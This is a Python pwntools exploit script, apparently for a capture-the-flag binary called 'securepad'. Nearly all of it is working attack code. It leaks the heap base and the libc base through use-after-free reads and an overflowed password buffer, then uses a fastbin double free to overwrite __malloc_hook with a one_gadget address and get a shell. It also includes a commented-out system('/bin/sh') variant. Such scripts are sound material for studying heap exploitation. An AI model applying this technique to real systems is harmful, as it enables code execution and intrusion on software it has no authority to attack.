#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from time import sleep
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
io = process('./securepad')
libc = ELF('./libc.so.6')
elf= ELF('./securepad')
one_gadget = 0x45216 # rax == NULL
one_gadget = 0x4526a # [rsp+0x30] == NULL
one_gadget = 0xf0274 # [rsp+0x50] == NULL
one_gadget = 0xf1117 # [rsp+0x70] == NULL
main_arena = 0x3c4b20
malloc_hook = 0x3c4b10


password = 'fuck'
def add(size, data):
    io.sendlineafter('>>> ', '1')
    io.sendlineafter('password\n', password)
    io.sendlineafter('size\n', str(size))
    io.sendafter('data: ', data)

def edit(index, data):
    io.sendlineafter('>>> ', '2')
    io.sendlineafter('password\n', password)
    io.sendlineafter('index\n', str(index))
    io.send(data)

def view(index):
    io.sendlineafter('>>> ', '4')
    io.sendlineafter('password\n', password)
    io.sendlineafter('index\n', str(index))

def remove(index):
    io.sendlineafter('>>> ', '3')
    io.sendlineafter('password\n', password)
    io.sendlineafter('index\n', str(index))

if __name__ == '__main__':
    raw_input('debug')
    # leak heap_base as the first byte must be \00
    add(8, 'aaaaaaaa')
    add(8, 'bbbbbbbb')
    remove(0)
    remove(1)
    add(1, '*') # 0
    view(0)
    io.recvuntil('*')
    heap_base = u64(io.recv(5).rjust(6, '\x00').ljust(8, '\x00'))
    success('heap base -> {:#x}'.format(heap_base))
    sleep(1)
    add(1, '*') # 1, bins cleaned now. top chunk = heap+0x40
    add(0x60, p64(0)+p64(145)+'c'*8+'d'*8+'\n') # 2
    add(0x20, 'e'*0x20) # 3
    add(0x60, 'f'*0x20+'\n') # 4
    # leak libc by unsorted bin
    password = 'a'*1008 + p64(heap_base+0x60)
    remove(15)
    password = 'fuck'
    add(8, 'a'*8)# 5
    view(5)
    io.recvuntil('a'*8)
    libc_base = u64(io.recv(6).ljust(8, '\x00'))-main_arena-216
    success('libc base -> {:#x}'.format(libc_base))
    sleep(1)
    # fast bin double free to hack the free hook
    remove(2)
    remove(4)
    password = 'a'*1008+p64(heap_base+0x50)
    remove(15) # bin -> 2 ->4 -> 2
    password = 'fuck'
    add(0x60,p64(libc_base+malloc_hook-35)+'\n') # bin -> 4 -> malloc_hook-19
    add(0x60, 'waste a chunk\n')
    add(0x60, 'waste second chunk\n')

    '''
    need to make a fake chunk to pass the malloc check
    sys_addr = libc_base + libc.sym['system']
    add(0x60, 'a'*19+p64(sys_addr)+'\n')
    edit(3, '/bin/sh\x00\n')
    remove(3) 
    '''
    
    add(0x60, 'a'*19+p64(0xf2519+libc_base)+'\n')
    raw_input('look at the registers!')
    add(100,'getshell\n')
    # one_gadget不可用！！
    
    io.interactive()
    io.close()
